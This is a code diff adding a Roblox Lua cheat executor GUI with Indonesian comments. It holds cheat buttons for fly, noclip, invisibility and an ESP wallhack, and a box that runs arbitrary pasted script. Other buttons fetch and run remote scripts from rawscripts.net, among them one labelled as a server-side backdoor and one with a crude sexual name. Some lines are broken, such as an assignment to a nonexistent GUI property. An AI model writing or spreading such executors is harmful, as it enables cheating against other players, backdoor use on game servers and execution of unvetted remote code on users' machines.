@@ -1,0 +1,280 @@
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
+local RunService = game:GetService("RunService")
+
+local LocalPlayer = Players.LocalPlayer
+local Mouse = LocalPlayer:GetMouse()
+
+pcall(function() CoreGui:FindFirstChild("NoobsExecutor"):Destroy() end)
+
+local gui = Instance.new("ScreenGui", CoreGui)
+gui.Name = "NoobsExecutor"
+gui.ResetOnSpawn = false
+
+-- Warna-warni nama GUI
+spawn(function()
+	local colors = {
+		Color3.fromRGB(255, 0, 0),
+		Color3.fromRGB(255, 128, 0),
+		Color3.fromRGB(255, 255, 0),
+		Color3.fromRGB(0, 255, 0),
+		Color3.fromRGB(0, 255, 255),
+		Color3.fromRGB(0, 0, 255),
+		Color3.fromRGB(128, 0, 255),
+	}
+	while gui do
+		for _, c in ipairs(colors) do
+			gui.Name = "NoobsExecutor"
+			gui.DisplayOrder = 10
+			gui:SetAttribute("Color", c)
+			gui.NameLabel = gui:FindFirstChild("NameLabel")
+			wait(0.15)
+		end
+	end
+end)
+
+-- Tombol Toggle Kecil
+local toggle = Instance.new("TextButton", gui)
+toggle.Size = UDim2.new(0, 40, 0, 40)
+toggle.Position = UDim2.new(0, 10, 0, 10)
+toggle.Text = ">"
+toggle.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+toggle.TextColor3 = Color3.new(1, 1, 1)
+toggle.Active = true
+toggle.Draggable = true
+
+-- Frame UI utama
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0, 600, 0, 400)
+frame.Position = UDim2.new(0.5, -300, 0.5, -200)
+frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+frame.Visible = false
+frame.Active = true
+frame.Draggable = true
+
+-- Resize handle
+local resize = Instance.new("TextButton", frame)
+resize.Size = UDim2.new(0, 20, 0, 20)
+resize.Position = UDim2.new(1, -20, 1, -20)
+resize.Text = "↘"
+resize.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+resize.TextColor3 = Color3.new(1, 1, 1)
+
+local resizing = false
+resize.MouseButton1Down:Connect(function() resizing = true end)
+UserInputService.InputEnded:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then resizing = false end
+end)
+RunService.RenderStepped:Connect(function()
+	if resizing then
+		local pos = UserInputService:GetMouseLocation()
+		local offset = pos - frame.AbsolutePosition
+		frame.Size = UDim2.new(0, math.clamp(offset.X, 300, 800), 0, math.clamp(offset.Y, 200, 600))
+	end
+end)
+
+-- Minimize dan Close
+local min = Instance.new("TextButton", frame)
+min.Size = UDim2.new(0, 30, 0, 30)
+min.Position = UDim2.new(1, -60, 0, 0)
+min.Text = "-"
+local close = Instance.new("TextButton", frame)
+close.Size = UDim2.new(0, 30, 0, 30)
+close.Position = UDim2.new(1, -30, 0, 0)
+close.Text = "X"
+for _, btn in ipairs({min, close}) do
+	btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+	btn.TextColor3 = Color3.new(1, 1, 1)
+	btn.Parent = frame
+end
+
+min.MouseButton1Click:Connect(function()
+	frame.Visible = false
+	toggle.Visible = true
+end)
+close.MouseButton1Click:Connect(function() gui:Destroy() end)
+toggle.MouseButton1Click:Connect(function()
+	frame.Visible = not frame.Visible
+end)
+
+-- Scroll Panel Tombol
+local scroll = Instance.new("ScrollingFrame", frame)
+scroll.Size = UDim2.new(0, 110, 1, -30)
+scroll.Position = UDim2.new(0, 0, 0, 30)
+scroll.CanvasSize = UDim2.new(0, 0, 0, 1000)
+scroll.ScrollBarThickness = 4
+scroll.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+
+local layout = Instance.new("UIListLayout", scroll)
+layout.SortOrder = Enum.SortOrder.LayoutOrder
+
+-- Helper buat tombol
+local function createButton(text, callback)
+	local btn = Instance.new("TextButton")
+	btn.Size = UDim2.new(1, -10, 0, 30)
+	btn.Text = text
+	btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+	btn.TextColor3 = Color3.new(1, 1, 1)
+	btn.Parent = scroll
+	btn.MouseButton1Click:Connect(callback)
+end
+
+-- Tombol
+local flyToggle = false
+createButton("Fly / UnFly", function()
+	local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+	if not hrp then return end
+	flyToggle = not flyToggle
+	local flying = flyToggle
+	local bv = Instance.new("BodyVelocity")
+	bv.Velocity = Vector3.new()
+	bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
+	bv.Parent = hrp
+	while flying do
+		RunService.RenderStepped:Wait()
+		local cam = workspace.CurrentCamera.CFrame
+		bv.Velocity = cam.LookVector * 60
+	end
+	bv:Destroy()
+end)
+
+-- Tambahan Tombol yang Anda minta
+createButton("starlight (backdoor)", function()
+	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Starlight-ServerSide-35958"))()
+end)
+
+createButton("je0K o2f", function()
+	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Jerk-off-slow-mode-38379"))()
+end)
+
+createButton("infinite Yield", function()
+	loadstring(game:HttpGet("https://rawscripts.net/raw/Infinite-Yield_500"))()
+end)
+
+local infjump = false
+createButton("Infinite Jump / UnJump", function()
+	infjump = not infjump
+	UserInputService.JumpRequest:Connect(function()
+		if infjump and LocalPlayer.Character then
+			LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
+		end
+	end)
+end)
+
+local invisible = false
+createButton("Invisible / Visible", function()
+	local char = LocalPlayer.Character
+	if not char then return end
+	for _, part in ipairs(char:GetDescendants()) do
+		if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+			part.Transparency = invisible and 0 or 1
+		end
+	end
+	invisible = not invisible
+end)
+
+local noclip = false
+createButton("NoClip / UnClip", function()
+	noclip = not noclip
+	RunService.Stepped:Connect(function()
+		if LocalPlayer.Character and noclip then
+			for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
+				if part:IsA("BasePart") then part.CanCollide = false end
+			end
+		end
+	end)
+end)
+
+local espToggle = false
+createButton("ESP / UnESP", function()
+	espToggle = not espToggle
+	if espToggle then
+		for _, player in ipairs(Players:GetPlayers()) do
+			if player ~= LocalPlayer and player.Character then
+				local box = Instance.new("BoxHandleAdornment")
+				box.Name = "ESPBox"
+				box.Adornee = player.Character:FindFirstChild("HumanoidRootPart")
+				box.Size = Vector3.new(4, 6, 2)
+				box.Color3 = Color3.new(1, 0, 0)
+				box.AlwaysOnTop = true
+				box.ZIndex = 10
+				box.Transparency = 0.5
+				box.Parent = player.Character
+			end
+		end
+	else
+		for _, player in ipairs(Players:GetPlayers()) do
+			if player.Character then
+				local box = player.Character:FindFirstChild("ESPBox")
+				if box then box:Destroy() end
+			end
+		end
+	end
+end)
+
+-- Kotak Script
+local box = Instance.new("TextBox", frame)
+box.Size = UDim2.new(1, -130, 0, 250)
+box.Position = UDim2.new(0, 120, 0, 40)
+box.TextXAlignment = Enum.TextXAlignment.Left
+box.TextYAlignment = Enum.TextYAlignment.Top
+box.TextWrapped = true
+box.MultiLine = true
+box.Text = "-- Masukkan script di sini"
+box.ClearTextOnFocus = false
+box.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+box.TextColor3 = Color3.new(1, 1, 1)
+box.Font = Enum.Font.Code
+box.TextSize = 14
+
+-- Tombol Eksekusi
+local execute = Instance.new("TextButton", frame)
+execute.Size = UDim2.new(0, 80, 0, 30)
+execute.Position = UDim2.new(0, 120, 0, 300)
+execute.Text = "Execute"
+execute.BackgroundColor3 = Color3.fromRGB(50, 120, 50)
+execute.TextColor3 = Color3.new(1, 1, 1)
+
+execute.MouseButton1Click:Connect(function()
+	local func = loadstring(box.Text)
+	if func then
+		pcall(func)
+	end
+end)
+
+-- Tombol Clear
+local clear = Instance.new("TextButton", frame)
+clear.Size = UDim2.new(0, 80, 0, 30)
+clear.Position = UDim2.new(0, 210, 0, 300)
+clear.Text = "Clear"
+clear.BackgroundColor3 = Color3.fromRGB(120, 50, 50)
+clear.TextColor3 = Color3.new(1, 1, 1)
+
+clear.MouseButton1Click:Connect(function()
+	box.Text = ""
+end)
+
+-- Tombol Save
+local savedScripts = {}
+
+local save = Instance.new("TextButton", frame)
+save.Size = UDim2.new(0, 80, 0, 30)
+save.Position = UDim2.new(0, 300, 0, 300)
+save.Text = "Save"
+save.BackgroundColor3 = Color3.fromRGB(50, 50, 120)
+save.TextColor3 = Color3.new(1, 1, 1)
+
+save.MouseButton1Click:Connect(function()
+	local name = tostring(math.random(1000, 9999))
+	savedScripts[name] = box.Text
+	local btn = Instance.new("TextButton", scroll)
+	btn.Size = UDim2.new(1, -10, 0, 30)
+	btn.Text = name
+	btn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+	btn.TextColor3 = Color3.new(1, 1, 1)
+	btn.MouseButton1Click:Connect(function()
+		local func = loadstring(savedScripts[name])
+		if func then pcall(func) end
+	end)
+end)
